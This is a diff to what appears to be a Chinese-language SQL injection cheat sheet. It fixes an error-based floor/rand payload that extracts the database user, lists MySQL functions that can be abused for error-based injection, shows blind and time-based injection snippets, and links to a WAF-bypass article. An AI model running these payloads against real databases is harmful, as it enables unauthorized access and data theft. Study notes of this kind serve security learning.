@@ -75,7 +75,7 @@ Eg.
 报错关键词有： floor、extractvalue、updatexml、geometrycollection、multipoint、polygon、multipolygon、linestring、multilinestring、ST_LatFromGeoHash、ST_LongFromGeoHash、GTID_SUBSET、GTID_SUBTRACT、ST_PointFromGeoHash
 #### 1. floor方式
 ```
-select 1,count(*),concat(0x3a,0x3a,(select use()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;
+select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;
 ```
 释义:
 >rand() 随机数函数 产生0-1的随机数
@@ -163,6 +163,10 @@ and 1=2
 AND ascii(SELECT SUBSTR(table_name,1,1) FROM information_schema.tables) =ascii( 'A')
 ### 0x07 时间型盲注
 SLEEP()
+## 常用小技巧
+### 1.多行合并一行   
+grouo_concat   
+'select a.*,group_concat(b.name separator '-') as name from a left join b on a.id=b.id group by a.id;'   
 ## Bypass
 ### 1.bypass WAF 
 - [sql-injection-fuck-waf](https://notwhy.github.io/2018/06/sql-injection-fuck-waf/)
